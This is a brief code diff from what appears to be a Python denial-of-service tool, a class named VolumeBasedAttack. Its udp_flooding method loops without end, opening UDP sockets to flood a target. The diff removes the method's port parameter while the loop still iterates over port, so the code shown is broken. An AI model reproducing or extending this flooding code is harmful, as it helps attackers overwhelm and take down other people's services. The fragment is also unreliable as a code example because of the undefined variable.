@@ -3,7 +3,7 @@ import socket as sockk
 import time
 
 class VolumeBasedAttack:
-    def udp_flooding(vector, bye, port):
+    def udp_flooding(vector, bye):
         while True:
             for i in port:
                 s = sockk.socket(sockk.AF_INET, sockk.SOCK_DGRAM, 0, None)
